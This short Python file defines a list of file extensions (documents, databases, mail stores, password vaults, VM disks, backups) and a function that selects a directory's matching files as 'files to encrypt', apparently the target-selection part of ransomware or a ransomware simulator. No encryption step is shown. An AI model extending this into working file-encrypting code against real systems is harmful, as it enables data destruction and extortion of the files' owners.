import os
from typing import List

VALID_FILE_EXTENSIONS_FOR_ENCRYPTION = {
    ".3ds",
    ".7z",
    ".accdb",
    ".ai",
    ".asp",
    ".aspx",
    ".avhd",
    ".avi",
    ".back",
    ".bak",
    ".c",
    ".cfg",
    ".conf",
    ".cpp",
    ".cs",
    ".ctl",
    ".dbf",
    ".disk",
    ".djvu",
    ".doc",
    ".docx",
    ".dwg",
    ".eml",
    ".fdb",
    ".giff",
    ".gz",
    ".h",
    ".hdd",
    ".jpg",
    ".jpeg",
    ".kdbx",
    ".mail",
    ".mdb",
    ".mpg",
    ".mpeg",
    ".msg",
    ".nrg",
    ".ora",
    ".ost",
    ".ova",
    ".ovf",
    ".pdf",
    ".php",
    ".pmf",
    ".png",
    ".ppt",
    ".pptx",
    ".pst",
    ".pvi",
    ".py",
    ".pyc",
    ".rar",
    ".rtf",
    ".sln",
    ".sql",
    ".tar",
    ".tiff",
    ".txt",
    ".vbox",
    ".vbs",
    ".vcb",
    ".vdi",
    ".vfd",
    ".vmc",
    ".vmdk",
    ".vmsd",
    ".vmx",
    ".vsdx",
    ".vsv",
    ".work",
    ".xls",
    ".xlsx",
    ".xvd",
    ".zip",
}


def get_files_to_encrypt(dir_path: str) -> List[str]:
    all_files = get_all_files_in_directory(dir_path)

    files_to_encrypt = []
    for file in all_files:
        if os.path.splitext(file)[1] in VALID_FILE_EXTENSIONS_FOR_ENCRYPTION:
            files_to_encrypt.append(file)

    return files_to_encrypt


def get_all_files_in_directory(dir_path: str) -> List:
    return list(
        filter(os.path.isfile, [os.path.join(dir_path, item) for item in os.listdir(dir_path)])
    )
